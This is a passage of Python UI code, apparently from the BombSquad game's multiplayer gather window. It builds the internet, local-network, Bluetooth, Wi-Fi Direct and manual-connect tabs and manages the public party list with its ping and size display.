            # attempt to fetch our local address so we have it for
            # error messages
            self._internetLocalAddress = None

            class AddrFetchThread(threading.Thread):
                def __init__(self, call):
                    threading.Thread.__init__(self)
                    self._call = call

                def run(self):
                    try:
                        # FIXME - update this to work with IPv6 at some point..
                        import socket
                        val = (
                            [(s.connect(('8.8.8.8', 80)),
                              s.getsockname()[0],
                              s.close())
                             for s
                             in
                             [socket.socket(
                                 socket.AF_INET, socket.SOCK_DGRAM)]][0][1])
                        bs.callInGameThread(bs.Call(self._call, val))
                    except Exception:
                        pass

            AddrFetchThread(bs.WeakCall(self._internetFetchLocalAddrCB)).start()

            self._setInternetTab(self._internet_tab)
            self._tabData = {}

            self._tabData['updateTimer'] = bs.Timer(
                200, bs.WeakCall(self._update_internet_tab),
                repeat=True, timeType='real')
            # also update it immediately so we don't have to wait for the
            # initial query..
            self._update_internet_tab()

        elif tab == 'localNetwork':
            cWidth = self._scrollWidth
            cHeight = self._scrollHeight-20
            sub_scroll_height = cHeight - 85
            sub_scroll_width = 650

            class NetScanner(object):
                def __init__(self, scrollWidget, tabButton, width):
                    self._scrollWidget = scrollWidget
                    self._tabButton = tabButton
                    self._columnWidget = bs.columnWidget(
                        parent=self._scrollWidget, leftBorder=10)
                    bs.widget(edit=self._columnWidget, upWidget=tabButton)
                    self._width = width
                    self._lastSelectedHost = None

                    self._updateTimer = bs.Timer(
                        1000, bs.WeakCall(self.update),
                        timeType='real', repeat=True)
                    # go ahead and run a few *almost* immediately so we dont
                    # have to wait a second
                    self.update()
                    bs.realTimer(250, bs.WeakCall(self.update))

                def __del__(self):
                    bsInternal._endHostScanning()

                def _onSelect(self, host):
                    self._lastSelectedHost = host

                def _onActivate(self, host):
                    bsInternal._connectToParty(host['address'])

                def update(self):
                    tScale = 1.6
                    for c in self._columnWidget.getChildren():
                        c.delete()
                    # grab this now this since adding widgets will change it
                    lastSelectedHost = self._lastSelectedHost
                    hosts = bsInternal._hostScanCycle()
                    for i, host in enumerate(hosts):
                        t = bs.textWidget(
                            parent=self._columnWidget,
                            size=(self._width/tScale, 30), selectable=True,
                            color=(1, 1, 1),
                            onSelectCall=bs.Call(self._onSelect, host),
                            onActivateCall=bs.Call(self._onActivate, host),
                            clickActivate=True,
                            text=host['displayString'], hAlign='left',
                            vAlign='center', cornerScale=tScale,
                            maxWidth=(self._width/tScale)*0.93)
                        if host == lastSelectedHost:
                            bs.containerWidget(
                                edit=self._columnWidget, selectedChild=t,
                                visibleChild=t)
                        if i == 0:
                            bs.widget(edit=t, upWidget=self._tabButton)

            self._tabContainer = c = bs.containerWidget(
                parent=self._rootWidget,
                position=(scrollLeft, scrollBottom +
                          (self._scrollHeight - cHeight) * 0.5),
                size=(cWidth, cHeight),
                background=False, selectionLoopToParent=True)
            v = cHeight - 30
            t = bs.textWidget(
                parent=c, position=(cWidth * 0.5, v - 3),
                color=(0.6, 1.0, 0.6),
                scale=1.3, size=(0, 0),
                maxWidth=cWidth * 0.9, hAlign='center', vAlign='center',
                text=bs.Lstr(
                    resource=self._r + '.localNetworkDescriptionText'))
            v -= 15
            v -= sub_scroll_height+23
            sw = bs.scrollWidget(
                parent=c,
                position=((self._scrollWidth - sub_scroll_width) * 0.5, v),
                size=(sub_scroll_width, sub_scroll_height))

            self._tabData = NetScanner(
                sw, self._tab_buttons[tab],
                width=sub_scroll_width)

            bs.widget(edit=sw, autoSelect=True, upWidget=self._tab_buttons[tab])

        elif tab == 'bluetooth':
            cWidth = self._scrollWidth
            cHeight = 380
            sub_scroll_height = cHeight - 150
            sub_scroll_width = 650

            bWidth = 250
            bWidth2 = 230
            self._tabContainer = c = bs.containerWidget(
                parent=self._rootWidget,
                position=(scrollLeft, scrollBottom +
                          (self._scrollHeight - cHeight) * 0.5),
                size=(cWidth, cHeight),
                background=False, selectionLoopToParent=True)
            imgSize = 100
            v = cHeight-30
            t = bs.textWidget(
                parent=c, position=(cWidth * 0.5, v),
                color=(0.6, 1.0, 0.6),
                scale=1.3, size=(0, 0),
                maxWidth=cWidth * 0.9, hAlign='center', vAlign='center',
                text=bs.Lstr(
                    resource=self._r + '.bluetoothDescriptionText'))
            v -= 35
            t = bs.textWidget(
                parent=c, position=(cWidth * 0.5, v),
                color=(0.6, 1.0, 0.6),
                scale=0.7, size=(0, 0),
                maxWidth=cWidth * 0.9, hAlign='center', vAlign='center',
                text=bs.Lstr(
                    resource=self._r + '.bluetoothAndroidSupportText'))

            v -= 55
            b = bs.buttonWidget(
                parent=c,
                position=(cWidth * 0.5 - sub_scroll_width * 0.5 + 10, v - 75),
                size=(300, 70),
                autoSelect=True, onActivateCall=bsInternal._bluetoothAdvertise,
                label=bs.Lstr(resource=self._r + '.bluetoothHostText'))
            bs.widget(edit=b, upWidget=self._tab_buttons[tab])
            b = bs.buttonWidget(
                parent=c,
                position=(cWidth * 0.5 - sub_scroll_width * 0.5 + 330, v - 75),
                size=(300, 70),
                autoSelect=True, onActivateCall=bs.Call(
                    bs.screenMessage, 'FIXME: not wired up yet'),
                label=bs.Lstr(resource=self._r + '.bluetoothJoinText'))
            bs.widget(edit=b, upWidget=self._tab_buttons[tab])
            bs.widget(edit=self._tab_buttons[tab], downWidget=b)

        elif tab == 'wifiDirect':
            cWidth = self._scrollWidth
            cHeight = self._scrollHeight-20
            sub_scroll_height = cHeight - 100
            sub_scroll_width = 650
            self._tabContainer = c = bs.containerWidget(
                parent=self._rootWidget,
                position=(scrollLeft, scrollBottom +
                          (self._scrollHeight - cHeight) * 0.5),
                size=(cWidth, cHeight),
                background=False, selectionLoopToParent=True)
            v = cHeight - 80

            t = bs.textWidget(
                parent=c, position=(cWidth * 0.5, v),
                color=(0.6, 1.0, 0.6),
                scale=1.0, size=(0, 0),
                maxWidth=cWidth * 0.95, maxHeight=140, hAlign='center',
                vAlign='center', text=bs.Lstr(
                    resource=self._r + '.wifiDirectDescriptionTopText'))
            v -= 140
            b = bs.buttonWidget(
                parent=c, position=(cWidth * 0.5 - 175, v),
                size=(350, 65),
                label=bs.Lstr(
                    resource=self._r + '.wifiDirectOpenWiFiSettingsText'),
                autoSelect=True,
                onActivateCall=bsInternal._androidShowWifiSettings)
            v -= 82

            bs.widget(edit=b, upWidget=self._tab_buttons[tab])

            t = bs.textWidget(
                parent=c, position=(cWidth * 0.5, v),
                color=(0.6, 1.0, 0.6),
                scale=0.9, size=(0, 0),
                maxWidth=cWidth * 0.95, maxHeight=150, hAlign='center',
                vAlign='center', text=bs.Lstr(
                    resource=self._r + '.wifiDirectDescriptionBottomText',
                    subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]))

        elif tab == 'manual':
            cWidth = self._scrollWidth
            cHeight = 380

            try:
                lastAddr = bs.getConfig()['Last Manual Party Connect Address']
            except Exception:
                lastAddr = ''

            self._tabContainer = c = bs.containerWidget(
                parent=self._rootWidget,
                position=(scrollLeft, scrollBottom +
                          (self._scrollHeight - cHeight) * 0.5),
                size=(cWidth, cHeight),
                background=False, selectionLoopToParent=True)
            v = cHeight-30
            t = bs.textWidget(
                parent=c, position=(cWidth * 0.5, v),
                color=(0.6, 1.0, 0.6),
                scale=1.3, size=(0, 0),
                maxWidth=cWidth * 0.9, hAlign='center', vAlign='center',
                text=bs.Lstr(resource=self._r + '.manualDescriptionText'))
            v -= 30
            v -= 70
            t = bs.textWidget(
                parent=c, position=(cWidth * 0.5 - 260 - 50, v),
                color=(0.6, 1.0, 0.6),
                scale=1.0, size=(0, 0),
                maxWidth=130, hAlign='right', vAlign='center', text=bs.Lstr(
                    resource=self._r + '.manualAddressText'))
            t = bs.textWidget(
                parent=c, editable=True, description=bs.Lstr(
                    resource=self._r + '.manualAddressText'),
                position=(cWidth * 0.5 - 240 - 50, v - 30),
                text=lastAddr, autoSelect=True, vAlign='center', scale=1.0,
                size=(420, 60))
            t2 = bs.textWidget(parent=c, position=(cWidth*0.5-260+490, v),
                               color=(0.6, 1.0, 0.6), scale=1.0,
                               size=(0, 0), maxWidth=80,
                               hAlign='right', vAlign='center',
                               text=bs.Lstr(resource=self._r+'.portText')
                               )
            t2 = bs.textWidget(
                parent=c, editable=True, description=bs.Lstr(
                    resource=self._r + '.portText'),
                text='43210', autoSelect=True, maxChars=5,
                position=(cWidth * 0.5 - 240 + 490, v - 30),
                vAlign='center', scale=1.0, size=(170, 60))

            v -= 110

            def _connect(textWidget, portTextWidget):
                addr = bs.textWidget(query=textWidget)
                if addr == '':
                    bs.screenMessage(
                        bs.Lstr(
                            resource='internal.invalidAddressErrorText'),
                        color=(1, 0, 0))
                    bs.playSound(bs.getSound('error'))
                    return
                try:
                    port = int(bs.textWidget(query=portTextWidget))
                    if port > 65535 or port < 0:
                        raise Exception()
                except Exception:
                    bs.screenMessage(
                        bs.Lstr(resource='internal.invalidPortErrorText'),
                        color=(1, 0, 0))
                    bs.playSound(bs.getSound('error'))
                    return

                class HostAddrFetchThread(threading.Thread):
                    def __init__(self, name, call):
                        threading.Thread.__init__(self)
                        self._name = name
                        self._call = call

                    def run(self):
                        try:
                            import socket
                            addr = socket.gethostbyname(self._name)
                            bs.callInGameThread(bs.Call(self._call, addr))
                        except Exception:
                            bs.callInGameThread(bs.Call(self._call, None))

                def doIt(addr):
                    if addr is None:
                        bs.screenMessage(
                            bs.Lstr(
                                resource='internal.unableToResolveHostText'),
                            color=(1, 0, 0))
                        bs.playSound(bs.getSound('error'))
                    else:
                        # store for later
                        bs.getConfig()[
                            'Last Manual Party Connect Address'] = addr
                        bs.writeConfig()
                        bsInternal._connectToParty(addr, port=port)
                HostAddrFetchThread(addr, doIt).start()

            b = bs.buttonWidget(
                parent=c, size=(300, 70),
                label=bs.Lstr(resource=self._r + '.manualConnectText'),
                position=(cWidth * 0.5 - 150, v),
                autoSelect=True, onActivateCall=bs.Call(_connect, t, t2))
            bs.widget(edit=t, upWidget=self._tab_buttons[tab])
            bs.textWidget(edit=t, onReturnPressCall=b.activate)
            bs.textWidget(edit=t2, onReturnPressCall=b.activate)
            v -= 45

            ts = 0.85
            tspc = 25

            #v -= 35
            def _safeSetText(t, val, success=True):
                if t.exists():
                    bs.textWidget(edit=t, text=val, color=(
                        0, 1, 0) if success else (1, 1, 0))

            # this currently doesn't work from china since we go through a
            # reverse proxy there
            # EDIT - it should work now; our proxy server forwards along
            # original IPs
            env = bs.getEnvironment()
            doInternetCheck = True

            def doIt(v, c):
                if not c.exists():
                    return

                bs.playSound(bs.getSound('swish'))
                t = bs.textWidget(
                    parent=c, position=(cWidth * 0.5 - 10, v),
                    color=(0.6, 1.0, 0.6),
                    scale=ts, size=(0, 0),
                    maxWidth=cWidth * 0.45, flatness=1.0, hAlign='right',
                    vAlign='center', text=bs.Lstr(
                        resource=self._r + '.manualYourLocalAddressText'))
                t = bs.textWidget(
                    parent=c, position=(cWidth * 0.5, v),
                    color=(0.5, 0.5, 0.5),
                    scale=ts, size=(0, 0),
                    maxWidth=cWidth * 0.45, flatness=1.0, hAlign='left',
                    vAlign='center', text=bs.Lstr(
                        resource=self._r + '.checkingText'))

                class AddrFetchThread(threading.Thread):
                    def __init__(self, window, textWidget):
                        threading.Thread.__init__(self)
                        self._window = window
                        self._textWidget = textWidget

                    def run(self):
                        try:
                            # FIXME - update this to work with IPv6 at
                            # some point..
                            import socket
                            val = (
                                [(s.connect(('8.8.8.8', 80)),
                                  s.getsockname()[0],
                                  s.close())
                                 for s
                                 in
                                 [socket.socket(
                                     socket.AF_INET, socket.SOCK_DGRAM)]][0]
                                [1])
                            bs.callInGameThread(
                                bs.Call(_safeSetText, self._textWidget, val))
                        except Exception as e:
                            errStr = str(e)
                            if 'Network is unreachable' in errStr:
                                bs.callInGameThread(
                                    bs.Call(_safeSetText, self._textWidget,
                                            bs.Lstr(resource=self._window._r
                                                    +'.noConnectionText'),
                                            False))
                            else:
                                bs.callInGameThread(
                                    bs.Call(_safeSetText, self._textWidget,
                                            bs.Lstr(resource=self._window._r
                                                    +'.addressFetchErrorText'),
                                            False))
                                bs.callInGameThread(
                                    bs.Call(
                                        bs.printError,
                                        'error in AddrFetchThread: ' + str(e)))
                AddrFetchThread(self, t).start()

                v -= tspc
                t = bs.textWidget(
                    parent=c, position=(cWidth * 0.5 - 10, v),
                    color=(0.6, 1.0, 0.6),
                    scale=ts, size=(0, 0),
                    maxWidth=cWidth * 0.45, flatness=1.0, hAlign='right',
                    vAlign='center', text=bs.Lstr(
                        resource=self._r
                        + '.manualYourAddressFromInternetText'))

                tAddr = bs.textWidget(
                    parent=c, position=(cWidth * 0.5, v),
                    color=(0.5, 0.5, 0.5),
                    scale=ts, size=(0, 0),
                    maxWidth=cWidth * 0.45, hAlign='left', vAlign='center',
                    flatness=1.0, text=bs.Lstr(
                        resource=self._r + '.checkingText'))
                v -= tspc
                t = bs.textWidget(
                    parent=c, position=(cWidth * 0.5 - 10, v),
                    color=(0.6, 1.0, 0.6),
                    scale=ts, size=(0, 0),
                    maxWidth=cWidth * 0.45, flatness=1.0, hAlign='right',
                    vAlign='center', text=bs.Lstr(
                        resource=self._r + '.manualJoinableFromInternetText'))

                tAccessible = bs.textWidget(
                    parent=c, position=(cWidth * 0.5, v),
                    color=(0.5, 0.5, 0.5),
                    scale=ts, size=(0, 0),
                    maxWidth=cWidth * 0.45, flatness=1.0, hAlign='left',
                    vAlign='center', text=bs.Lstr(
                        resource=self._r + '.checkingText'))
                v -= 28
                tAccessibleExtra = bs.textWidget(
                    parent=c, position=(cWidth * 0.5, v),
                    color=(1, 0.5, 0.2),
                    scale=0.7, size=(0, 0),
                    maxWidth=cWidth * 0.9, flatness=1.0, hAlign='center',
                    vAlign='center', text='')

                self._doing_access_check = False
                self._access_check_count = 0  # cap our refreshes eventually..
                self._tabData['accessCheckTimer'] = bs.Timer(
                    10000, bs.WeakCall(
                        self._access_check_update, tAddr, tAccessible,
                        tAccessibleExtra),
                    repeat=True, timeType='real')
                self._access_check_update(
                    tAddr, tAccessible, tAccessibleExtra)  # kick initial off

                if checkButton.exists():
                    checkButton.delete()

            if doInternetCheck:
                checkButton = b = bs.textWidget(
                    parent=c, size=(250, 60),
                    text=bs.Lstr(resource=self._r + '.showMyAddressText'),
                    vAlign='center', hAlign='center', clickActivate=True,
                    position=(cWidth * 0.5 - 125, v - 30),
                    autoSelect=True, color=(0.5, 0.9, 0.5),
                    scale=0.8, selectable=True, onActivateCall=bs.Call(
                        doIt, v, c))

    def _internetFetchLocalAddrCB(self, val):
        self._internetLocalAddress = str(val)

    def _setInternetTab(self, value, playSound=False):
        if playSound:
            bs.playSound(bs.getSound('click01'))

        # if we're switching in from elsewhere, reset our selection
        # (prevents selecting something way down the list if we switched away
        # and came back)
        if self._internet_tab != value:
            self._public_party_list_selection = None

        self._internet_tab = value
        # activeColor = (0.4,1.0,0.4)
        activeColor = (0.6, 1.0, 0.6)
        inactiveColor = (0.5, 0.4, 0.5)
        bs.textWidget(
            edit=self._internetJoinText, color=activeColor
            if value == 'join' else inactiveColor)
        bs.textWidget(
            edit=self._internetHostText, color=activeColor
            if value == 'host' else inactiveColor)

        # clear anything in existence..
        for attr in [
            '_internetHostScrollWidget', '_internetHostNameText',
            '_internetHostToggleButton', '_internetHostNameLabelText',
            '_internetHostStatusText', '_internetJoinPartySizeLabel',
            '_internetJoinNameLabel', '_internetJoinPartyNameLabel',
            '_internetJoinPartyLanguageLabel', '_internetJoinPartyPingLabel',
            '_internetHostMaxPartySizeLabel', '_internetHostMaxPartySizeValue',
            '_internetHostMaxPartySizeMinusButton',
            '_internetHostMaxPartySizePlusButton', '_internet_join_status_text',
                '_internetHostDedicatedServerInfoText']:
            widget = getattr(self, attr, None)
            if widget is not None:
                widget.delete()
                delattr(self, attr)

        cWidth = self._scrollWidth
        cHeight = self._scrollHeight-20
        sub_scroll_height = cHeight - 90
        sub_scroll_width = 830
        v = cHeight - 35
        v -= 25
        isPublicEnabled = bsInternal._getPublicPartyEnabled()
        if value == 'join':
            # reset this so we do an immediate refresh query
            self._internetJoinLastRefreshTime = -99999
            # reset our list of public parties
            self._public_parties = {}
            self._last_public_party_list_rebuild_time = 0
            self._first_public_party_list_rebuild_time = None
            self._internetJoinPartyNameLabel = bs.textWidget(
                text=bs.Lstr(resource='nameText'),
                parent=self._tabContainer, size=(0, 0),
                position=(90, v - 8),
                maxWidth=60, scale=0.6, color=(0.5, 0.5, 0.5),
                flatness=1.0, shadow=0.0, hAlign='center', vAlign='center')
            if False:
                self._internetJoinPartyLanguageLabel = bs.textWidget(
                    text=bs.Lstr(
                        resource='settingsWindowAdvanced.languageText'),
                    parent=self._tabContainer, size=(0, 0),
                    position=(662, v - 8),
                    maxWidth=100, scale=0.6, color=(0.5, 0.5, 0.5),
                    flatness=1.0, shadow=0.0, hAlign='center', vAlign='center')
            self._internetJoinPartySizeLabel = bs.textWidget(
                text=bs.Lstr(resource=self._r + '.partySizeText'),
                parent=self._tabContainer, size=(0, 0),
                position=(755, v - 8),
                maxWidth=60, scale=0.6, color=(0.5, 0.5, 0.5),
                flatness=1.0, shadow=0.0, hAlign='center', vAlign='center')
            self._internetJoinPartyPingLabel = bs.textWidget(
                text=bs.Lstr(resource=self._r + '.pingText'),
                parent=self._tabContainer, size=(0, 0),
                position=(825, v - 8),
                maxWidth=60, scale=0.6, color=(0.5, 0.5, 0.5),
                flatness=1.0, shadow=0.0, hAlign='center', vAlign='center')
            v -= sub_scroll_height+23

            self._internetHostScrollWidget = sw = bs.scrollWidget(
                parent=self._tabContainer, simpleCullingV=10,
                position=((self._scrollWidth - sub_scroll_width) * 0.5, v),
                size=(sub_scroll_width, sub_scroll_height))
            bs.widget(edit=sw, autoSelect=True)
            cw = self._internetHostColumnWidget = bs.containerWidget(
                parent=sw, background=False, size=(400, 400))
            bs.containerWidget(edit=sw, claimsLeftRight=True)
            bs.containerWidget(edit=cw, claimsLeftRight=True)

            self._internet_join_status_text = bs.textWidget(
                parent=self._tabContainer, text=bs.Lstr(
                    value='${A}...',
                    subs=[('${A}', bs.Lstr(resource='store.loadingText'))]),
                size=(0, 0),
                scale=0.9, flatness=1.0, shadow=0.0, hAlign='center',
                vAlign='top', maxWidth=cWidth, color=(0.6, 0.6, 0.6),
                position=(cWidth * 0.5, cHeight * 0.5))

            tScale = 1.6

        if value == 'host':
            v -= 30
            partyNameText = bs.Lstr(
                resource='gatherWindow.partyNameText',
                fallbackResource='editGameListWindow.nameText')
            self._internetHostNameLabelText = bs.textWidget(
                parent=self._tabContainer, size=(0, 0),
                hAlign='right', vAlign='center', maxWidth=200, scale=0.8,
                color=gInfoTextColor, position=(210, v - 9),
                text=partyNameText)
            self._internetHostNameText = bs.textWidget(
                parent=self._tabContainer, editable=True, size=(535, 40),
                position=(230, v - 30),
                text=bs.getConfig().get('Public Party Name', ''),
                maxWidth=494, shadow=0.3, flatness=1.0,
                description=partyNameText, autoSelect=True, vAlign='center',
                cornerScale=1.0)

            v -= 60
            self._internetHostMaxPartySizeLabel = bs.textWidget(
                parent=self._tabContainer, size=(0, 0),
                hAlign='right', vAlign='center', maxWidth=200, scale=0.8,
                color=gInfoTextColor, position=(210, v - 9),
                text=bs.Lstr(
                    resource='maxPartySizeText',
                    fallbackResource='maxConnectionsText'))
            self._internetHostMaxPartySizeValue = bs.textWidget(
                parent=self._tabContainer, size=(0, 0),
                hAlign='center', vAlign='center', scale=1.2, color=(1, 1, 1),
                position=(240, v - 9),
                text=str(bsInternal._getPublicPartyMaxSize()))
            b1 = self._internetHostMaxPartySizeMinusButton = bs.buttonWidget(
                parent=self._tabContainer, size=(40, 40),
                onActivateCall=bs.WeakCall(
                    self._onMaxPublicPartySizeMinusPress),
                position=(280, v - 26),
                label='-', autoSelect=True)
            b2 = self._internetHostMaxPartySizePlusButton = bs.buttonWidget(
                parent=self._tabContainer, size=(40, 40),
                onActivateCall=bs.WeakCall(
                    self._onMaxPublicPartySizePlusPress),
                position=(350, v - 26),
                label='+', autoSelect=True)
            v -= 50
            v -= 70
            if isPublicEnabled:
                label = bs.Lstr(
                    resource='gatherWindow.makePartyPrivateText',
                    fallbackResource='gatherWindow.stopAdvertisingText')
            else:
                label = bs.Lstr(
                    resource='gatherWindow.makePartyPublicText',
                    fallbackResource='gatherWindow.startAdvertisingText')
            self._internetHostToggleButton = bs.buttonWidget(
                parent=self._tabContainer, label=label, size=(400, 80),
                onActivateCall=self._on_stop_internet_advertising_press
                if isPublicEnabled else self._on_start_internet_advertizing_press,
                position=(cWidth * 0.5 - 200, v),
                autoSelect=True, upWidget=b2)
            bs.widget(edit=self._internetHostNameText, downWidget=b2)
            bs.widget(edit=b2, upWidget=self._internetHostNameText)
            bs.widget(edit=b1, upWidget=self._internetHostNameText)
            bs.widget(
                edit=self._internetJoinText,
                downWidget=self._internetHostNameText)
            v -= 10
            self._internetHostStatusText = bs.textWidget(
                parent=self._tabContainer, text=bs.Lstr(
                    resource=self._r + '.partyStatusNotPublicText'),
                size=(0, 0),
                scale=0.7, flatness=1.0, shadow=0.0, hAlign='center',
                vAlign='top', maxWidth=cWidth, color=(0.6, 0.6, 0.6),
                position=(cWidth * 0.5, v))
            v -= 90
            self._internetHostDedicatedServerInfoText = bs.textWidget(
                parent=self._tabContainer, text=bs.Lstr(
                    resource=self._r + '.dedicatedServerInfoText'),
                size=(0, 0),
                scale=0.7, flatness=1.0, shadow=0.0, hAlign='center',
                vAlign='center', maxWidth=cWidth * 0.9, color=gInfoTextColor,
                position=(cWidth * 0.5, v))

            # if public sharing is already on, launch a status-check immediately
            if bsInternal._getPublicPartyEnabled():
                self._do_internet_status_check()

        # now add a lock icon overlay for if we don't have pro
        icon = getattr(self, '_internetLockIcon', None)
        if icon is not None and icon.exists():
            self._internetLockIcon.delete()  # kill any existing
        self._internetLockIcon = bs.imageWidget(
            parent=self._tabContainer,
            position=(cWidth * 0.5 - 60, cHeight * 0.5 - 50),
            size=(120, 120),
            opacity=0.0 if not self._isInternetLocked() else 0.5,
            texture=bs.getTexture('lock'))

    def _isInternetLocked(self):
        if bsInternal._getAccountMiscReadVal('ilck', False):
            return False if bsUtils._havePro() else True
        else:
            return False

    def _onMaxPublicPartySizeMinusPress(self):
        val = bsInternal._getPublicPartyMaxSize()
        val -= 1
        if val < 1:
            val = 1
        bsInternal._setPublicPartyMaxSize(val)
        bs.textWidget(edit=self._internetHostMaxPartySizeValue, text=str(val))

    def _onMaxPublicPartySizePlusPress(self):
        val = bsInternal._getPublicPartyMaxSize()
        val += 1
        bsInternal._setPublicPartyMaxSize(val)
        bs.textWidget(edit=self._internetHostMaxPartySizeValue, text=str(val))

    def _onPublicPartyQueryResult(self, result):

        with bs.Context('UI'):

            # any time we get any result at all, kill our loading status
            status_text = getattr(self, '_internet_join_status_text', None)
            if status_text is not None and status_text.exists():
                # dont show results if not signed in (probably didnt get any
                # anyway)
                if bsInternal._getAccountState() != 'SIGNED_IN':
                    bs.textWidget(
                        edit=status_text, text=bs.Lstr(
                            resource='notSignedInText'))
                else:
                    if result is None:
                        bs.textWidget(
                            edit=status_text, text=bs.Lstr(
                                resource='errorText'))
                    else:
                        bs.textWidget(edit=status_text, text='')

            if result is not None:
                partiesIn = result['l']
            else:
                partiesIn = []

            for party in self._public_parties.values():
                party['claimed'] = False

            for partyIn in partiesIn:
                # party is indexed by (ADDR)_(PORT)
                partyKey = partyIn['a']+'_'+str(partyIn['p'])
                party = self._public_parties.get(partyKey)
                if party is None:
                    # if this party is new to us, init it..
                    index = getattr(self, '_nextPublicPartyEntryIndex', 0)
                    self._nextPublicPartyEntryIndex = index + 1
                    party = self._public_parties[partyKey] = {
                        'address': partyIn.get('a'),
                        'nextPingTime': bs.getRealTime()+partyIn['pd'],
                        'ping': None,
                        'index': index,
                    }
                # now, new or not, update its values
                party['queue'] = partyIn.get('q')
                party['port'] = partyIn.get('p')
                party['name'] = partyIn['n']
                party['size'] = partyIn['s']
                party['language'] = partyIn['l']
                party['sizeMax'] = partyIn['sm']
                party['claimed'] = True
                party['pingInterval'] = partyIn['pi']
                party['statsAddr'] = partyIn['sa']

            # prune unclaimed party entries
            self._public_parties = dict([
                entry for entry in self._public_parties.items()
                if entry[1]['claimed']
            ])

            self._rebuild_public_party_list()

    def _rebuild_public_party_list(self):
        curTime = bs.getRealTime()
        if self._first_public_party_list_rebuild_time is None:
            self._first_public_party_list_rebuild_time = curTime
        # update faster for the first few seconds;
        # then ease off to keep the list from jumping around
        since_first = curTime - self._first_public_party_list_rebuild_time
        wait_time = (1000 if since_first < 2000 else 2500
                     if since_first < 10000 else 5000)
        if curTime - self._last_public_party_list_rebuild_time < wait_time:
            return
        self._last_public_party_list_rebuild_time = curTime

        # first off, check for the existence of our column widget;
        # if we don't have this, we're done
        columnWidget = getattr(self, '_internetHostColumnWidget', None)
        if columnWidget is None or not columnWidget.exists():
            return

        # ourLanguage = bs.getLanguage()

        with bs.Context('UI'):

            # now kill and recreate all widgets
            for widget in columnWidget.getChildren():
                widget.delete()

            # sort - show queue-enabled ones first and sort by lowest ping
            orderedParties = sorted(
                self._public_parties.values(),
                key=lambda party: (
                    party['queue'] is None,  # show non-queud last
                    party['ping'] if party['ping'] is not None else 999999,
                    party['index'],
                    party))
            existingSelection = getattr(self, '_public_party_list_selection',
                                        None)
            first = True

            sub_scroll_width = 830
            # rval = random.randrange(4, 10)
            # print 'doing', rval
            # ordered_parties = ordered_parties[:rval]
            lineheight = 42
            sub_scroll_height = lineheight * len(orderedParties) + 50
            bs.containerWidget(
                edit=columnWidget, size=(sub_scroll_width, sub_scroll_height))

            # ew; this rebuilding generates deferred selection callbacks
            # so we need to generated deferred ignore notices for ourself
            def refresh_on():
                self._refreshing_public_party_list = True

            bs.pushCall(refresh_on)

            # janky - allow escaping if there's nothing in us
            bs.containerWidget(
                edit=self._internetHostScrollWidget,
                claimsUpDown=(len(orderedParties) > 0))

            for i, party in enumerate(orderedParties):
                hpos = 20
                vpos = sub_scroll_height - lineheight * i - 50
                party['nameWidget'] = bs.textWidget(
                    text=bs.Lstr(value=party['name']),
                    parent=columnWidget,
                    size=(sub_scroll_width * 0.63, 20),
                    position=(0 + hpos, 4 + vpos),
                    selectable=True,
                    onSelectCall=bs.WeakCall(
                        self._set_public_party_selection,
                        (party['address'], 'name')),
                    onActivateCall=bs.WeakCall(
                        self._on_public_party_activate, party),
                    clickActivate=True,
                    maxWidth=sub_scroll_width * 0.45,
                    cornerScale=1.4,
                    autoSelect=True,
                    color=(1, 1, 1, 0.3 if party['ping'] is None else 1.0),
                    hAlign='left',
                    vAlign='center')
                bs.widget(edit=party['nameWidget'],
                          leftWidget=self._internetJoinText,
                          showBufferTop=64.0,
                          showBufferBottom=64.0)
                if existingSelection == (party['address'], 'name'):
                    bs.containerWidget(edit=columnWidget,
                                       selectedChild=party['nameWidget'])
                if False:
                    party['languageWidget'] = bs.textWidget(
                        text=bs.Lstr(
                            translate=('languages', party['language'])),
                        parent=c, drawController=c, size=(0, 0),
                        position=(sub_scroll_width * 0.73, 20),
                        maxWidth=sub_scroll_width * 0.13, scale=0.7,
                        color=(0.8, 0.8, 0.8),
                        hAlign='center', vAlign='center')
                if party['statsAddr'] != '':
                    url = party['statsAddr'].replace(
                        '${ACCOUNT}', bsInternal._getAccountMiscReadVal2(
                            'resolvedAccountID', 'UNKNOWN'))
                    party['stats_button'] = bs.buttonWidget(
                        color=(0.3, 0.6, 0.94),
                        textColor=(1.0, 1.0, 1.0),
                        label=bs.Lstr(resource='statsText'),
                        parent=columnWidget,
                        autoSelect=True,
                        onActivateCall=bs.Call(
                            bs.openURL, url),
                        onSelectCall=bs.WeakCall(
                            self._set_public_party_selection,
                            (party['address'], 'stats_button')),
                        size=(120, 40),
                        position=(sub_scroll_width * 0.66 + hpos, 1 + vpos),
                        scale=0.9)
                    if existingSelection == (party['address'],
                                              'stats_button'):
                        bs.containerWidget(
                            edit=columnWidget,
                            selectedChild=party['stats_button'])
                else:
                    if 'stats_button' in party: del party['stats_button']

                if first:
                    if 'stats_button' in party:
                        bs.widget(
                            edit=party['stats_button'],
                            upWidget=self._internetJoinText)
                    if 'nameWidget' in party:
                        bs.widget(
                            edit=party['nameWidget'],
                            upWidget=self._internetJoinText)
                    first = False

                party['size_widget'] = bs.textWidget(
                    text=str(party['size']) + '/' + str(party['sizeMax']),
                    parent=columnWidget,
                    size=(0, 0),
                    position=(sub_scroll_width * 0.86 + hpos, 20 + vpos),
                    scale=0.7,
                    color=(0.8, 0.8, 0.8),
                    hAlign='right',
                    vAlign='center')

                party['ping_widget'] = bs.textWidget(
                    parent=columnWidget,
                    size=(0, 0),
                    position=(sub_scroll_width * 0.94 + hpos, 20 + vpos),
                    scale=0.7,
                    hAlign='right',
                    vAlign='center')
                if party['ping'] is None:
                    bs.textWidget(
                        edit=party['ping_widget'],
                        text='-',
                        color=(0.5, 0.5, 0.5))
                else:
                    ping_good = (
                        bsInternal._getAccountMiscReadVal('pingGood', 100))
                    ping_med = (
                        bsInternal._getAccountMiscReadVal('pingMed', 500))
                    bs.textWidget(
                        edit=party['ping_widget'],
                        text=str(party['ping']),
                        color=(0, 1, 0)
                        if party['ping'] <= ping_good else (1, 1, 0)
                        if party['ping'] <= ping_med else (1, 0, 0))
            # so our selection callbacks can start firing..
            def refresh_on():
                self._refreshing_public_party_list = False

            bs.pushCall(refresh_on)


    def _on_public_party_activate(self, party):
        if party['queue'] is not None:
            import bsUI2
            bs.playSound(bs.getSound('swish'))
            bsUI2.PartyQueueWindow(
                party['queue'],
                party['address'],
                party['port'])
        else:
            address = party['address']
            port = party['port']
            if self._isInternetLocked():
                if bsInternal._getAccountState() != 'SIGNED_IN':
                    showSignInPrompt()
                else:
                    PurchaseWindow(items=['pro'])
                return
            # rate limit this a bit
            now = time.time()
            last_connect_time = getattr(
